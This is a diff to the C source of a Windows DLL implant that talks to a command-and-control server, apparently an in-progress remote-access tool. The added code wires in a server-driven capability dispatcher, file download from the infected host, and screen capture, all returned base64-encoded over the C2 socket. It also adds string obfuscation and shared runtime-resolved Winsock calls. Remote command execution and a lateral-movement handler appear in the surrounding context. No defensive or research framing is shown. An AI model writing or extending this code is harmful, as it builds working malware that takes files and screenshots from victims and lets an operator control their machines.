@@ -209,7 +209,10 @@ static void *px_proc(HMODULE h, const char *name)
 /* ================================================================== */
 /* NOTE: size_t comes from <stddef.h>. On Win64 'unsigned long' is still
  * 32-bit (LLP64), so it must never be used for a length or a pointer. */
+#ifndef PX_SIZE_T_DEFINED
+#define PX_SIZE_T_DEFINED
 typedef size_t px_size_t;
+#endif
 
 /* MSVC treats memcpy/memset/memmove as intrinsics and refuses to let them
  * be defined ("C2169: intrinsic function, cannot be defined"). The
@@ -299,6 +302,43 @@ static px_size_t px_strcpy(char *dst, const char *src, px_size_t cap)
     return i;
 }
 
+/* Concatenate, with a bound. Returns the new length. */
+px_size_t px_strcat(char *dst, const char *src, px_size_t cap)
+{
+    px_size_t d = px_strlen(dst);
+    px_size_t s = 0;
+    while (src[s] && d + 1 < cap) {
+        dst[d++] = src[s++];
+    }
+    dst[d] = '\0';
+    return d;
+}
+
+/* Case-insensitive substring search. Returns a pointer to the match, or
+ * NULL. */
+const char *px_strstr_ci(const char *hay, const char *needle)
+{
+    px_size_t nl = px_strlen(needle);
+    if (!nl)
+        return hay;
+    for (; *hay; hay++) {
+        px_size_t i;
+        for (i = 0; i < nl; i++) {
+            char a = hay[i];
+            char b = needle[i];
+            if (a >= 'A' && a <= 'Z')
+                a = (char)(a - 'A' + 'a');
+            if (b >= 'A' && b <= 'Z')
+                b = (char)(b - 'A' + 'a');
+            if (a != b)
+                break;
+        }
+        if (i == nl)
+            return hay;
+    }
+    return NULL;
+}
+
 /* ================================================================== */
 /* The protocol vocabulary                                              */
 /* ================================================================== */
@@ -377,6 +417,11 @@ typedef struct px_vocab {
     char log_enc_state[48];
     char log_backoff[64];
     char log_reconnect[64];
+    char log_transfer[64];
+    char download[8];
+    char cap_cmd[8];
+    char log_cap[64];
+    char screenshot[8];
 } px_vocab;
 
 static px_vocab g_vocab;
@@ -442,6 +487,11 @@ static void px_vocab_init(void)
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_ENC_STATE, g_vocab.log_enc_state);
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_BACKOFF, g_vocab.log_backoff);
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_RECONNECT, g_vocab.log_reconnect);
+    PX_VOCAB_DECODE(PX_SID_TXT_LOG_TRANSFER, g_vocab.log_transfer);
+    PX_VOCAB_DECODE(PX_SID_PROTO_DOWNLOAD, g_vocab.download);
+    PX_VOCAB_DECODE(PX_SID_PROTO_CAP, g_vocab.cap_cmd);
+    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CAP, g_vocab.log_cap);
+    PX_VOCAB_DECODE(PX_SID_PROTO_SCREENSHOT, g_vocab.screenshot);
 #else
     px_strcpy(g_vocab.hello, "HELLO|", sizeof(g_vocab.hello));
     px_strcpy(g_vocab.caps, "CAPS|", sizeof(g_vocab.caps));
@@ -1289,6 +1339,163 @@ static int px_env(const char *name, char *out, int cap)
  * definitions. */
 #include "px_endpoints.c"
 
+/* The capability library.
+ *
+ * It uses the payload's helpers and the Winsock wrappers, so it is
+ * included after them -- and BEFORE the command handlers, because those
+ * handlers call into it.
+ *
+ * The Winsock functions it needs are handed over by the payload after
+ * they are resolved at runtime, so the library shares the payload's
+ * socket layer rather than carrying a second copy of it. */
+#include "px_capabilities.c"
+
+/* ------------------------------------------------------------------ */
+/* The capability command                                              */
+/* ------------------------------------------------------------------ */
+/*                                                                       */
+/* The server sends:                                                    */
+/*                                                                       */
+/*     CAP|<name>|<arguments>                                          */
+/*                                                                       */
+/* and the payload looks the name up in the capability table. One verb   */
+/* for every technique would mean changing the protocol every time      */
+/* something was added, and the two would drift.                        */
+/*                                                                       */
+/* Returns 1 if the command was handled, 0 if the line was not a        */
+/* capability command.                                                  */
+/* ------------------------------------------------------------------ */
+static int px_handle_cap_cmd(PX_SOCKET sock, fn_send p_send,
+                             char *line, int *handled)
+{
+    char *name;
+    char *args;
+    char report[2048];
+    char *b64;
+    static char reply[65536];
+    px_size_t rn;
+
+    *handled = 0;
+
+    if (px_strncmp(line, g_vocab.cap_cmd, 4) != 0)
+        return 0;
+
+    *handled = 1;
+    name = line + 4;
+    args = px_strchr(name, '|');
+    if (args) {
+        *args = '\0';
+        args++;
+    } else {
+        args = name + px_strlen(name);
+    }
+
+#if PX_CAPABILITIES
+    if (!px_cap_run(name, args, report, sizeof(report))) {
+        px_snprintf(report, sizeof(report),
+                    "unknown capability '%s'", name);
+    }
+#else
+    px_snprintf(report, sizeof(report),
+                "this build has no capability library compiled in");
+#endif
+
+    px_logf(g_vocab.log_cap, name, report);
+    b64 = b64_encode((const unsigned char *)report, (px_size_t)px_strlen(report));
+    rn = px_fmt(reply, sizeof(reply), g_vocab.f_result,
+                "cap", b64 ? b64 : "", 0);
+    send_line(sock, reply, (int)rn, p_send);
+    if (b64)
+        HeapFree(GetProcessHeap(), 0, b64);
+    return 1;
+}
+
+/* The file transfer and screen capture capabilities.
+ *
+ * They use px_fmt, b64_encode and send_line, so they are included after
+ * all three are defined. */
+#include "px_file.c"
+
+/* ------------------------------------------------------------------ */
+/* The transfer commands                                               */
+/* ------------------------------------------------------------------ */
+/*                                                                       */
+/* Both the plain and the encrypted receive paths handle these, and     */
+/* they must behave identically -- a capability that works in one arm    */
+/* and silently does nothing in the other is a bug that would look    */
+/* like a missing capability.                                           */
+/*                                                                       */
+/* So the logic lives HERE, once, and the two paths call it.            */
+/*                                                                       */
+/* Returns 1 if the command was handled, 0 if the line was not one    */
+/* of these commands.                                                   */
+/* ------------------------------------------------------------------ */
+static int px_handle_transfer_cmd(PX_SOCKET sock, fn_send p_send,
+                                  char *line, int *handled)
+{
+    char *cmd_id;
+    char *path;
+    char report[256];
+    long rc = -1;
+    char *b64;
+    static char reply[65536];
+    px_size_t rn;
+
+    *handled = 0;
+
+    if (px_strncmp(line, g_vocab.download, 3) == 0) {
+        *handled = 1;
+        cmd_id = line + 3;
+        path = px_strchr(cmd_id, '|');
+        if (!path)
+            return 1;
+        *path = '\0';
+        path++;
+
+#if PX_FILE_TRANSFER
+        rc = px_file_download(sock, p_send, cmd_id, path);
+        if (rc == 0)
+            px_snprintf(report, sizeof(report),
+                        "transfer of %s completed", path);
+        else
+            px_snprintf(report, sizeof(report),
+                        "transfer of %s failed", path);
+#else
+        px_snprintf(report, sizeof(report),
+                    "this build has no file transfer capability");
+#endif
+    } else if (px_strncmp(line, g_vocab.screenshot, 5) == 0) {
+        *handled = 1;
+        cmd_id = line + 5;
+        {
+            char *bar = px_strchr(cmd_id, '|');
+            if (bar)
+                *bar = '\0';
+        }
+#if PX_SCREENSHOT
+        rc = px_screen_capture(sock, p_send, cmd_id);
+        if (rc == 0)
+            px_snprintf(report, sizeof(report), "screen capture completed");
+        else
+            px_snprintf(report, sizeof(report), "screen capture failed");
+#else
+        px_snprintf(report, sizeof(report),
+                    "this build has no screen capture capability");
+#endif
+    } else {
+        return 0;
+    }
+
+    px_logf(g_vocab.log_transfer, cmd_id, report);
+    b64 = b64_encode((const unsigned char *)report, (px_size_t)px_strlen(report));
+    rn = px_fmt(reply, sizeof(reply), g_vocab.f_result,
+                cmd_id, b64 ? b64 : "", rc);
+    send_line(sock, reply, (int)rn, p_send);
+    if (b64)
+        HeapFree(GetProcessHeap(), 0, b64);
+    return 1;
+}
+
 __declspec(dllexport) void px_entry(void)
 {
     PX_SOCKET sock;
@@ -1422,6 +1629,16 @@ __declspec(dllexport) void px_entry(void)
         p_inet_addr = (fn_inet_addr)px_proc(hws, "inet_addr");
         p_htons = (fn_htons)px_proc(hws, "htons");
         p_wsalasterror = (fn_getlasterror)px_proc(hws, "WSAGetLastError");
+        /* Hand the resolved Winsock functions to the capability library,
+         * so the port scan and the C2 session share one socket layer
+         * rather than two copies of it. */
+#if PX_CAPABILITIES
+        px_cap_set_sockets((PX_SOCKET (*)(int, int, int))p_socket,
+                           (int (*)(PX_SOCKET, const void *, int))p_connect,
+                           (int (*)(PX_SOCKET))p_closesocket,
+                           (unsigned long (*)(const char *))p_inet_addr,
+                           (unsigned short (*)(unsigned short))p_htons);
+#endif
         p_gethostbyname = (fn_gethostbyname)px_proc(hws, "gethostbyname");
         if (!p_wsastartup || !p_socket || !p_connect || !p_send || !p_recv) {
             px_logf(g_vocab.log_ws_exports);
@@ -1540,7 +1757,7 @@ connect_again:
     {
         char line[64];
         px_size_t n = px_fmt(line, sizeof(line), g_vocab.f_caps,
-                             (unsigned long)PX_CAPABILITIES_MASK);
+                             (unsigned long)PX_CAP_MASK);
         send_line(sock, line, (int)n, p_send);
     }
 
@@ -1621,11 +1838,18 @@ connect_again:
             }
             {
                 char *bar1, *bar2;
+                int handled = 0;
                 if (px_strncmp(plain, g_vocab.ping, 4) == 0) {
                     send_line(sock, g_vocab.pong, 4, p_send);
                 } else if (px_strncmp(plain, g_vocab.exit, 4) == 0) {
                     px_logf(g_vocab.log_exit);
                     goto done;
+                } else if (px_handle_cap_cmd(sock, p_send, plain,
+                                            &handled)) {
+                    /* A capability from the library. */
+                } else if (px_handle_transfer_cmd(sock, p_send, plain,
+                                                  &handled)) {
+                    /* The file download or the screen capture. */
                 } else if (px_strncmp(plain, g_vocab.exec, 5) == 0) {
                     char *cmd_id = plain + 5;
                     char *cmd;
@@ -1689,7 +1913,8 @@ connect_again:
                     }
                     if (b64)
                         HeapFree(GetProcessHeap(), 0, b64);
-                } else if (px_strncmp(plain, g_vocab.lateral, 8) == 0) {
+                }
+                else if (px_strncmp(plain, g_vocab.lateral, 8) == 0) {
                     char *cmd_id = plain + 8;
                     char *host;
                     char report[1024];
@@ -1746,6 +1971,7 @@ connect_again:
         for (;;) {
             char *line = px_strchr(recvbuf, '\n');
             char *bar1, *bar2;
+            int handled = 0;
 
             if (!line)
                 break;
@@ -1762,6 +1988,12 @@ connect_again:
             } else if (px_strncmp(recvbuf, g_vocab.exit, 4) == 0) {
                 px_logf(g_vocab.log_exit);
                 goto done;
+            } else if (px_handle_cap_cmd(sock, p_send, recvbuf,
+                                        &handled)) {
+                /* A capability from the library. */
+            } else if (px_handle_transfer_cmd(sock, p_send, recvbuf,
+                                              &handled)) {
+                /* The file download or the screen capture. */
             } else if (px_strncmp(recvbuf, g_vocab.exec, 5) == 0) {
                 char *cmd_id = recvbuf + 5;
                 char *cmd;
@@ -1834,7 +2066,8 @@ connect_again:
                 }
                 if (b64)
                     HeapFree(GetProcessHeap(), 0, b64);
-            } else if (px_strncmp(recvbuf, g_vocab.lateral, 8) == 0) {
+            }
+            else if (px_strncmp(recvbuf, g_vocab.lateral, 8) == 0) {
                 /* The lateral movement capability.
                  *
                  * One explicitly named target, no scanning, no
